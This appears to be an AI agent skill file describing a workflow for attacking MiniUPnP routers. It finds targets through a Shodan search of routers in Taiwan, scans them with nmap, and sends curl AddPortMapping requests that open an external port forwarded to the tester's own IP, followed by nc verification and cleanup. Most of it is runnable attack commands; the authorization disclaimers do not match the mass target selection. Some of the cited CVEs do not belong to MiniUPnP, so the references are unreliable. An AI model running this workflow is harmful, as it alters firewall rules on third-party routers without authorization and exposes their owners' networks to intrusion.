---
name: miniupnp-port-mapping-test
description: Workflow to discover MiniUPnP routers via Shodan, enumerate them with Nmap, check known CVEs, and test UPnP port‑mapping (AddPortMapping) on authorized targets.
version: 1.0.0
author: Hermes Agent
---

# Overview
This skill automates a typical reconnaissance and exploitation flow for MiniUPnP (v1.6, Netgear SDK 4.3.0.0) devices. It is intended for use **only on systems you have explicit permission to test**.

# Steps
1. **Shodan discovery**
   ```bash
   shodan search "router" country:TW --limit 20
   ```
   Filter results for services on port 7777 (MiniUPnP).

2. **Nmap scanning**
   ```bash
   nmap -p 7777 -sV --script=upnp-info <IP>
   ```
   Verify the banner shows `MiniUPnP 1.6 (Netgear SDK 4.3.0.0)`.

3. **CVE lookup**
   - Use Shodan host view (`shodan host <IP>`) to collect listed CVEs.
   - Cross‑reference with NVD or `searchsploit` for exploitation status.

4. **Port‑mapping test (AddPortMapping)**
   *Prerequisite:* you control a listener on a reachable IP (`MY_IP`).
   ```bash
   curl -s -X POST "http://<IP>:7777/control?service=WANIPConnection" \
        -d "Action=AddPortMapping&NewRemoteHost=&NewExternalPort=5555&NewProtocol=TCP&NewInternalPort=5555&NewInternalClient=MY_IP&NewEnabled=1&NewPortMappingDescription=exploit&NewLeaseDuration=0"
   ```
   - Expect HTTP 200 on vulnerable devices.
   - Verify by connecting: `nc -v <IP> 5555`.

5. **Cleanup** (if successful and authorized)
   ```bash
   curl -s -X POST "http://<IP>:7777/control?service=WANIPConnection" \
        -d "Action=DeletePortMapping&NewRemoteHost=&NewExternalPort=5555&NewProtocol=TCP"
   ```

# Pitfalls & Tips
- Many ISPs NAT the traffic; the router may only accept internal LAN IPs for `NewInternalClient`. Use a VPN or a host inside the same subnet if possible.
- Some firmware versions patch the AddPortMapping function; a 200 response does not guarantee the rule is applied—always test the inbound connection.
- Rate‑limit your requests; aggressive scanning may trigger DoS protection or be flagged as abuse.
- Ensure the target is within the legal scope; unauthorized probing is illegal.

# Verification
- Successful test results in an open TCP listener on the remote host at the chosen external port.
- Removal of the rule restores the original firewall state.

# References
- CVE‑2014‑2324, CVE‑2018‑19052, CVE‑2019‑11072 (MiniUPnP 1.6)
- `searchsploit upnp MiniUPnP` for PoC scripts.
- Shodan documentation for bulk download (`shodan download`).

# Disclaimer
This workflow is provided for educational and authorized penetration‑testing purposes only. Misuse may violate laws and regulations.
